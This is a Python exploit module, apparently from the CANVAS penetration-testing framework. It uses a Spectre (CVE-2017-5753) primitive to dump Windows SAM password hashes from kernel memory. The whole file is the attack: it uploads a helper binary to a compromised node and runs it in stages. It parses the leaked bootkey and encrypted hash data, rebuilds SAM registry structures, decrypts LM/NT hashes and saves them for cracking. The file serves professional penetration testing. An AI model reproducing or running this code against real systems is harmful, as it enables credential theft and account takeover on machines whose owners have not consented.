#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  spectre_sam_leak.py
## Description:
##            :
## Created_On :  Sat Jul 07 2018
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localexploit import LocalExploit
from canvaserror import NodeCommandError
from exploitutils import *

NAME                            = "Spectre Sam Leak"
DESCRIPTION                     = "Dumps the LM/NT hashes from the kernel memory using a Spectre primitive"

DOCUMENTATION                   = {}
DOCUMENTATION["CVE Name"]       = "CVE-2017-5753"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5753"
DOCUMENTATION["Notes"]          = """
The final version should also handle Windows 2016 and 10.
In fact the backend is perfectly working on Windows 2016 but libwincreds is not
able to deal with Windows 2016 and 10 yet.

The debug flag is for developers only and is not accessible to users from the GUI.
"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Exploit'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ '7', '2008', '2012', '8.1' ]

# Necessary to import & decrypt the hashes.
import libs.libwincreds.libwincreds as libwincreds

NBR_STAGES = 4
REMOTE_UPLOAD_FNAME = 'spectre.exe'

# Protocol
MSG_SEPARATOR = ':::' #"[[DEAD_BEEF]]"
MSG_HDR = "[CANVAS]"

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.result            = ""
        self.name              = NAME
        self.local_path        = os.path.dirname(__file__)
        self.binary_path       = os.path.join(self.local_path, "bin")
        self.db_path           = os.path.join(self.local_path, "db")
        self.upload_dir        = None
        self.local_exp_name    = 'winleak_spectre.exe'
        self.debug             = False
        self.JD                = None
        self.Skew1             = None
        self.GBG               = None
        self.Data              = None
        self.nr_users          = None
        self.users             = []

        #self.db_cache = os.path.join(self.db_path, 'cache' % randint)
        if not os.path.exists(self.db_path):
            os.makedirs(self.db_path)
        return

    def getargs(self):
        """
        The arguments handling function
        """

        self.node  = self.argsDict['passednodes'][0]
        self.debug = self.argsDict.get('debug', self.debug)
        # The debug mode requires a different binary.
        # Note: This is CEU only and the driver will not be provided for normal
        # CANVAS releases.
        if self.debug:
            self.local_exp_name = 'winleak_driver.exe'

    ###
    # node.shell API based functions.
    ###

    def upload_file(self, src, dst):
        """
        Handles the upload of the binary on the target.
        """

        try:
            self.node.upload(src, destfilename = dst)
        except Exception as e:
            logging.error('Failed to upload %s to %s: %s' % (src, dst, str(e)))
            return False
        logging.info('Upload succeeded')
        return True

    def exec_windows_cmd(self, cmd):
        """
        Execute a commandline.
        """

        try:
            ret = self.node.shell.popen2(cmd)
            return True, ret.replace(':NOP:', '')
        except Exception as e:
            return False, str(e)

    ###
    # Display & Save the extracted hashes
    ###

    def dump_hashes(self):
        """
        This function dumps hashes.
        """

        self.john_file = ''
        for user in self.users:
            line = '%s:%s:%s:%s:::' % (user['name'], user['rid'], user['lm'], user['ntlm'])
            logging.info(line)
            self.john_file += '%s\n' % line

    def save_hashes(self):
        """
        This function dumps hashes in a JOHN format.
        """

        try:
            timestamp = time.strftime('%h_%H_%Y__%H%M')
            fname = 'leaked-SAM-%s.txt' % (timestamp)
            fullpath = os.path.join(canvas_root_directory, self.db_path, fname)
            f = open(fullpath, 'wb+')
            f.write(self.john_file)
            f.close()
        except Exception as e:
            logging.error('Error while saving the leaked file: %s' % str(e))
        else:
            logging.info('File successfully saved in %s' % fullpath)

    ###
    # WINDOWS specific API
    ###

    def build_windows_cmd(self, stg=1, user_index=0):
        """
        Build the commandline as a function of:
            - ???
        """

        L = []
        L.append(os.path.join(self.upload_dir, REMOTE_UPLOAD_FNAME))
        L.append('-c 0')
        L.append('-m')
        L.append('-s %d' % stg)
        L.append('-C xxx4.txt')
        if stg > 3:
            L.append('-u %d' % user_index)
        cmd = ' '.join(L)
        logging.debug("STG:%d CMD %s" % (stg, cmd))
        return cmd

    ###
    # Library API
    ###

    def create_fake_F(self):
        """
        Creates a fake F out of the leaked memory for DecryptHashFromSamDomainAccount()
        """
        self.F  = '\0' * 0x70
        self.F += self.F1
        self.F += self.F2
        self.F += '\0' * 16

    def create_fake_V(self):
        """
        For each user:
            - Creates a fake V out of the leaked memory for DecryptHashFromSamDomainAccount()
        """

        for user in self.users:
            V  = '\0' * 0x9c
            V += struct.pack("<L", 256) # HashOffset
            V += struct.pack("<L", 0x14) if user['hasLM'] else struct.pack("<L", 0)
            V += '\0' * 8
            V += struct.pack("<L", 0x14) if user['hasNT'] else struct.pack("<L", 0)
            padding_length = (256 + 0xcc + 8) - len(V)
            V  += '\0' * padding_length
            if user['hasLM']:
                V += user['encryptedLM']
                if user['hasNT']:
                    V += user['encryptedNT']
            else:
                if user['hasNT']:
                    V += user['encryptedNT']
            user['V'] = V


    ###
    # Protocol API
    ###

    def __handle_stage1(self, data):
        """
        Stage #1: Encrypted bootkey reception.
        """
        # An exception would be caught within handle_windows_cmd()
        self.JD, self.Skew1, self.GBG, self.Data = data.rstrip().split('-')
        logging.info('JD = %s' % repr(self.JD.decode('hex')))
        logging.info('Skew1 = %s' % repr(self.Skew1.decode('hex')))
        logging.info('GBG = %s' % repr(self.GBG.decode('hex')))
        logging.info('Data = %s' % repr(self.Data.decode('hex')))

    def __handle_stage2(self, data):
        """
        Stage #2: Reception of encrypted pieces of the bootkey encryptor.
        """
        self.F1 = data.decode('hex')[:16]
        self.F2 = data.decode('hex')[16:48]
        logging.info('F1=%s' % self.F1.encode('hex'))
        logging.info('F2=%s' % self.F2.encode('hex'))

    def __handle_stage3(self, data):
        """
        Stage #3: Nr users receptor
        """
        self.nr_users = int(data, 10)
        logging.info('%d users on this system' % self.nr_users)

    def __handle_stage4(self, data):
        """
        Stage #4 Handler aka encrypted hash receptor
        """
        L = data.split(MSG_SEPARATOR)
        User = {}
        User['name'] = L[0]
        User['rid'] = int(L[1],10)
        User['hasLM'] = bool(int(L[2]))
        User['hasNT'] = bool(int(L[3]))
        User['encryptedLM'] = L[4].decode('hex')
        User['encryptedNT'] = L[5].decode('hex')
        self.users.append(User)

    def handle_windows_cmd(self, msg_str):
        """
        Parses the cmdline.
        """

        try:
            msg_list = msg_str.split(MSG_SEPARATOR)
            hdr = msg_list[0]
            if hdr != MSG_HDR or len(msg_list) < 4:
                logging.critical('Protocol error with message: %s' % msg_str)
                return False

            ret_code = int(msg_list[1])
            stg = int(msg_list[2])
            data = MSG_SEPARATOR.join(msg_list[3:])

            if ret_code:
                logging.info('Message sent by the exploit during stage %d: \"%s\"' % (stg,data))
                return False

            if stg not in [1,2,3,4]:
                logging.error('An incorrect frame targeting a non existant stage %d was received: \"%s\"' % (stg,data))
                return False

            if stg == 1:
                self.__handle_stage1(data)
            elif stg == 2:
                self.__handle_stage2(data)
            elif stg == 3:
                self.__handle_stage3(data)
            else:
                self.__handle_stage4(data)
            return True

        except Exception as e:
            logging.critical('Protocol error: %s generated exception %s' % (msg_str, str(e)))
            return False

    def get_tmp(self, user):
        """
        Sets self.upload_dir one way or another.
        """

        self.upload_dir = self.node.shell.GetTempPathA()
        if not self.upload_dir:
            L = user.split('\\')
            if len(L) == 2:
                username = L[1]
            else:
                username = L[0]

            self.upload_dir = "C:\\Users\\%s\\AppData\\Local\\Temp\\" % username

    def is_valid_target(self):
        """
        Decides to continue or not.
        """

        # TODO. We have a bug currently with GetVersionEx() and it needs to be
        # be fixed before performing any test.
        #version = self.node.shell.GetVersionEx()
        #print version
        return True


    def do_exploit_windows(self):
        """
        Performs the actual exploitation on Windows.
        """

        # First of all, let's determine who we are currently.
        user = self.node.shell.whoami()
        if not user:
            logging.error("whoami() failed to return the remote account\n")
            user = '???'

        logging.info('Node is running under account \"%s\"' % user)

        if not self.is_valid_target():
            logging.critical('Sorry, the current version of the exploit does not support this target')
            return self.fail()

        self.get_tmp(user)
        if not self.upload_dir:
            logging.error("Could not retrieve the %TMP% directory to push spectre.exe")
            return self.fail()

        logging.info('Uploading the binary to %s' % self.upload_dir)
        ret = self.upload_file(os.path.join(self.binary_path, self.local_exp_name),
                               os.path.join(self.upload_dir, REMOTE_UPLOAD_FNAME))
        if not ret:
            logging.error('Upload failed, game over.')
            return self.fail()

        # At this point the executable is pushed and can be run.

        NBR_STAGES=3
        NBR_ATTEMPTS=3
        for stg in xrange(1, NBR_STAGES+1):

            cmd = self.build_windows_cmd(stg)
            logging.debug('CMD built is: %s' % cmd)

            logging.info('Starting stage %d' % stg)
            stg_succeeded = False

            for i in xrange(NBR_ATTEMPTS):
                ret, msg = self.exec_windows_cmd(cmd)
                if not ret:
                    logging.error('Attempt %d: Execution failed in stage %d with error: %s' % (i, stg, msg))
                    continue

                logging.debug('Attempt %d: Received: %r' % (i,msg))
                if not self.handle_windows_cmd(msg.rstrip('\r\n')):
                    continue

                stg_succeeded = True
                break

            if not stg_succeeded:
                return False
            # Update the progress bar
            self.setProgress(20+stg*20)

        logging.info('Starting stage 4')
        for idx_user in xrange(self.nr_users):

            cmd = self.build_windows_cmd(stg=4,user_index=idx_user)
            logging.debug('CMD built is: %s' % cmd)

            for i in xrange(NBR_ATTEMPTS):
                ret, msg = self.exec_windows_cmd(cmd)
                if not ret:
                    logging.error('Execution failed in stage %d with error: %s' % (stg, msg))
                    continue

                logging.debug('Received: %r' % msg)
                if not self.handle_windows_cmd(msg.rstrip('\r\n')):
                    continue

                break

            self.setProgress(90)

        # At this point we Spectre (or the Driver in demo mode) has extracted all the
        # required information.

        # First we must recreate fake registry Key Values as the wincreds library
        # is generic and thus does not handle partial values.

        self.create_fake_F()  # The Global 'F' Key Value
        self.create_fake_V()  # The 'V' Key Value which is a per user one

        # Now we can extract the syskey.
        syskey = libwincreds.ExtractSysKey(self.JD.decode('hex'),
                                             self.Skew1.decode('hex'),
                                             self.GBG.decode('hex'),
                                             self.Data.decode('hex'))

        # Then for each user, one can decrypt the corresponding hash
        for user in self.users:

            if not user['hasLM']:
                user['lm'] = 'aad3b435b51404eeaad3b435b51404ee'
            else:
                ret, LMHash = libwincreds.DecryptHashFromSamDomainAccount(syskey, user['rid'], self.F, user['V'], password_type='LM')
                if ret != 0:
                    logging.error('Error while decrypting the LM hash for user \'%s\'' % user['name'])
                    user['lm'] = '****ERROR*****'
                else:
                    user['lm'] = LMHash.encode('hex')

            if not user['hasNT']:
                user['ntlm'] = '31d6cfe0d16ae931b73c59d7e0c089c0'
            else:
                ret, NTHash = libwincreds.DecryptHashFromSamDomainAccount(syskey, user['rid'], self.F, user['V'], password_type='NT')
                if ret != 0:
                    logging.error('Error while decrypting the NTLM hash for user \'%s\'' % user['name'])
                    user['ntlm'] = '****ERROR*****'
                else:
                    user['ntlm'] = NTHash.encode('hex')

        # Dump the hashes in the console
        self.dump_hashes()
        # Save the hashes in a file
        self.save_hashes()

        self.setInfo("%s Done (Success)" % (self.name))
        self.setProgress(100)
        return self.success()

    def clean_tmp(self):
        """
        It's cleaner without the binary.
        """

        if self.node.shell and self.upload_dir:
            self.node.shell.unlink(os.path.join(self.upload_dir, REMOTE_UPLOAD_FNAME))

    def success(self):
        self.clean_tmp()
        self.setInfo("%s - done (success: %s)" % (NAME,self.result))
        return 1

    def fail(self):
        self.clean_tmp()
        self.setInfo('%s - done (ERROR)' % NAME)
        return 0

    def is_64bit_windows_node(self):
        if "win64api" in self.node.capabilities:
            return True
        else:
            return False

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        if isinstance(self.node, localNode):
            logging.critical('Node of type %s not supported' % self.node.nodetype)
            return self.fail()

        if not self.node.shell:
            logging.critical("Node doesn't have a shell")
            return self.fail()

        if not self.is_64bit_windows_node():
            logging.critical("Exploit does not support non 64 bits nodes")
            return self.fail()

        return self.do_exploit_windows()


if __name__== "__main__":
    logging.warning("This is an exploit that should be used only from within CANVAS")
